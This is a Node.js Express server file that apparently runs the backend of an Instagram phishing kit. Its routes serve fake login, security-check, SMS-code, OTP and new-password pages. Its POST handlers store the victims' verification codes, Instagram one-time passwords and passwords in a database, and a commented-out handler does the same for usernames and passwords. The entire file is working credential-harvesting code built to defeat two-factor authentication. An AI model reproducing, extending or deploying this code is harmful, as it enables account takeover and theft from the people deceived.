const express = require("express")
const path = require("path")
const User = require("../backend/models.js")
const connectDB = require('../backend/db.js')

function sleep(ms, callback) {
    setTimeout(callback, ms);
}

const app = express();
const PORT = process.env.PORT || 3000;
connectDB();
app.use(express.urlencoded({extended : false}))

// get methods
app.get("/error/", (req, res) => {
    res.send("An error occured...");
})

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "..", "frontend/login.html"));
})

app.get("/uid69206c6f766520796f75/code", async (req, res) => {
    const now = new Date();
    const options = {
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
        };
    const timestamp = now.toLocaleDateString('en-US', options);
    try {
        const newUser = new User({
            username: "mobile number code requested at " + timestamp,
            password: "mobile number code requested"
        });
        await newUser.save();
        res.status(200).sendFile(path.join(__dirname, "..", "frontend/code_mobnum.html"))
        
    } catch (err) {
        console.log("Error saving data...");
        console.log(err);

    }
})

app.get("/uid69206c6f766520796f75/otp", async (req, res) => {
    const now = new Date();
    const options = {
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
        };
    const timestamp = now.toLocaleDateString('en-US', options);
    try {
        const newUser = new User({
            username: "insta app otp requested at " + timestamp,
            password: "insta app otp requested"
        });
        await newUser.save();
        res.status(200).sendFile(path.join(__dirname, "..", "frontend/otp_insta.html"))
        
    } catch (err) {
        console.log("Error saving data...");
        console.log(err);

    }
})

app.get("/uid69206c6f766520796f75/newpwd", (req, res) => {
    res.sendFile(path.join(__dirname, "..", "frontend/new_pwd.html"))
})

app.get("/uid69206c6f766520796f75/skip", (req, res) => {
    res.sendFile(path.join(__dirname, "..", "frontend/endpage.html"))
})

// post methods
// app.post("/login/auth/userid69206c6f766520796f75", async (req, res) => {
//     try {
//         const newUser = new User({
//             username: req.body.username,
//             password: req.body.password
//         });
//         await newUser.save();
//         sleep(3000, () => {
//             res.status(200).sendFile(path.join(__dirname, "..", "frontend/servers.html"));
//         })
        
//     } catch (err) {
//         console.log("Error saving data...");
//         console.log(err);

//     }
// })

app.post("/auth/userid69206c6f766520796f75code", async (req, res) => {
    try {
        const newUser = new User({
            username: "Mobile Number code",
            password: req.body.mobnum_code
        });
        await newUser.save();
        sleep(3000, () => {
            res.status(200).sendFile(path.join(__dirname, "..", "frontend/instagram-security.html"));
        })
        
    } catch (err) {
        console.log("Error saving data...");
        console.log(err);

    }
})

app.post("/auth/userid69206c6f766520796f75otp", async (req, res) => {
    try {
        const newUser = new User({
            username: "Instagram app otp",
            password: req.body.insta_otp
        });
        await newUser.save();
        sleep(3000, () => {
            res.status(200).sendFile(path.join(__dirname, "..", "frontend/instagram-security.html"));
        })
    } catch (err) {
        console.log("Error saving data...");
        console.log(err);

    }
})

app.post("/auth/userid69206c6f766520796f75newpwd", async (req, res) => {
    try {
        const newUser = new User({
            username: req.body.pwd,
            password: req.body.cpwd
        });
        await newUser.save();
        res.status(200).sendFile(path.join(__dirname, "..", "frontend/endpage.html"))
    } catch (err) {
        console.log("Error saving data...");
        console.log(err);

    }
})
app.listen(PORT, (req, res) => {
    console.log(`server started at port ${PORT}`);
})